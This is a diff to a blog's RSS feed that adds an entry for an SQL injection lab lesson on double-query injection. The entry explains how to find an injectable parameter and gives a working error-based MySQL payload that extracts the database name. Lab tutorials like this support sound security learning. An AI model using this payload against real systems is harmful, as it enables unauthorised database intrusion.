@@ -6,8 +6,15 @@
     <description>Recent content in Labs on r00tpunk</description>
     <generator>Hugo</generator>
     <language>en-us</language>
-    <lastBuildDate>Mon, 08 Sep 2025 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 22 Sep 2025 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://r00tpunk.github.io/tags/labs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SQL Injection Lab – Lesson 2 (Double Query Injection)</title>
+      <link>https://r00tpunk.github.io/posts/learning/less2/</link>
+      <pubDate>Mon, 22 Sep 2025 00:00:00 +0000</pubDate>
+      <guid>https://r00tpunk.github.io/posts/learning/less2/</guid>
+      <description>&lt;h1 id=&#34;double-query-sub-query-injection&#34;&gt;Double Query (Sub-Query) Injection&lt;/h1&gt;&#xA;&lt;h2 id=&#34;find-injectable-parameter&#34;&gt;Find injectable parameter&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Look for parameters placed inside single quotes: &lt;code&gt;id=&#39;...&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Confirm the app shows errors or returns a page that changes on bad input (even if message hidden — error may still be logged).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;If the response changes, parameter is injectable. If you get SQL error, good — proceed carefully.&lt;/p&gt;&#xA;&lt;h2 id=&#34;dumping-database-name&#34;&gt;Dumping database name&lt;/h2&gt;&#xA;&lt;p&gt;Payload:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; AND (select 1 from (select count(*), concat(0x3a,0x3a,(select database()),0x3a,0x3a, floor(rand()*2))a from information_schema.columns group by a)b) --+&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;if error shows &lt;em&gt;&lt;strong&gt;DataBase name&lt;/strong&gt;&lt;/em&gt;, you succeeded.&#xA;&lt;img src=&#34;https://r00tpunk.github.io/sqli-02/ss1.jpg&#34; alt=&#34;Alt text&#34;&gt;&lt;/p&gt;</description>
+    </item>
     <item>
       <title>SQL Injection Lab – Lesson 1 (Error-Based: String)</title>
       <link>https://r00tpunk.github.io/posts/learning/less1/</link>
